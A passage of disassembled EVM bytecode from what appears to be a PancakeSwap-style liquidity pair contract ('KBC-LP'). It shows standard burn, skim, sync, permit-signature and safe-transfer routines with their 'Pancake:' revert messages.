SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1258 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x126C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1282 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP2 SWAP3 POP PUSH2 0x12A1 DUP9 DUP9 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x12B8 DUP5 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12BF JUMPI INVALID JUMPDEST DIV SWAP11 POP DUP1 PUSH2 0x12D3 DUP5 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12DA JUMPI INVALID JUMPDEST DIV SWAP10 POP PUSH1 0x0 DUP12 GT DUP1 ISZERO PUSH2 0x12ED JUMPI POP PUSH1 0x0 DUP11 GT JUMPDEST PUSH2 0x1328 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2627 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1332 ADDRESS DUP5 PUSH2 0x23E4 JUMP JUMPDEST PUSH2 0x133D DUP8 DUP14 DUP14 PUSH2 0x1C69 JUMP JUMPDEST PUSH2 0x1348 DUP7 DUP14 DUP13 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP10 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x138E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x13A2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x13B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP7 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1404 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1418 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x142E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP4 POP PUSH2 0x143E DUP6 DUP6 DUP12 DUP12 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x146E JUMPI PUSH1 0xB SLOAD PUSH2 0x146A SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP13 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP13 SWAP1 MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP16 AND SWAP3 CALLER SWAP3 PUSH32 0xDCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496 SWAP3 SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP POP POP POP POP POP POP PUSH1 0x1 PUSH1 0xF DUP2 SWAP1 SSTORE POP SWAP2 POP SWAP2 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST PUSH2 0x3E8 DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1559 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND SWAP5 SWAP1 SWAP4 AND SWAP3 PUSH2 0x1608 SWAP3 DUP6 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 DUP6 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x15DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x166F SWAP3 DUP5 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x16DF JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x17FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1830 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1881 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x188C DUP10 DUP10 DUP10 PUSH2 0x2079 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x18E2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x18F2 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1946 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x195A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1970 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19C3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x19D7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x19ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1A0C DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A29 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A37 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1A70 JUMPI PUSH2 0x1A5B PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP PUSH2 0x1A6A PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1A90 JUMP JUMPDEST PUSH2 0x1A8D PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x1ACF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25FF PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1AD9 DUP11 DUP11 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1B52 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x1C62 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1BA3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1BB7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1BCD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C1A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C2E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1C44 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x1 PUSH1 0xF SSTORE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x19 DUP2 MSTORE PUSH32 0x7472616E7366657228616464726573732C75696E743235362900000000000000 PUSH1 0x20 SWAP2 DUP3 ADD MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP1 DUP4 ADD DUP7 SWAP1 MSTORE DUP5 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP3 ADD DUP5 MSTORE SWAP2 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR DUP2 MSTORE SWAP3 MLOAD DUP2 MLOAD PUSH1 0x0 SWAP5 PUSH1 0x60 SWAP5 DUP10 AND SWAP4 SWAP3 SWAP2 DUP3 SWAP2 SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1D16 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1CF7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1D78 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D7D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 DUP1 ISZERO PUSH2 0x1DAB JUMPI POP DUP1 MLOAD ISZERO DUP1 PUSH2 0x1DAB JUMPI POP DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1DA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD JUMPDEST PUSH2 0x1DFC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x18 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A205452414E534645525F4641494C45440000000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO DUP1 PUSH2 0x1E1E JUMPI POP POP DUP1 DUP3 MUL DUP3 DUP3 DUP3 DUP2 PUSH2 0x1E1B JUMPI INVALID JUMPDEST DIV EQ JUMPDEST PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6D756C2D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 GT DUP1 ISZERO SWAP1 PUSH2 0x1ED4 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 GT ISZERO JUMPDEST PUSH2 0x1F19 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x11 PUSH1 0x24 DUP3 ADD MSTORE PUSH17 0x50616E63616B653A204F564552464C4F57 PUSH1 0x78 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0xB SLOAD PUSH4 0xFFFFFFFF TIMESTAMP DUP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV DUP2 AND DUP3 SUB SWAP1 DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1F49 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 AND ISZERO ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x1F5D JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 AND ISZERO ISZERO JUMPDEST ISZERO PUSH2 0x1FCE JUMPI DUP1 PUSH4 0xFFFFFFFF AND PUSH2 0x1F8B DUP6 PUSH2 0x1F76 DUP7 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x2568 AND JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE PUSH4 0xFFFFFFFF DUP2 AND PUSH2 0x1FB6 DUP5 PUSH2 0x1F76 DUP8 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0xD DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE JUMPDEST 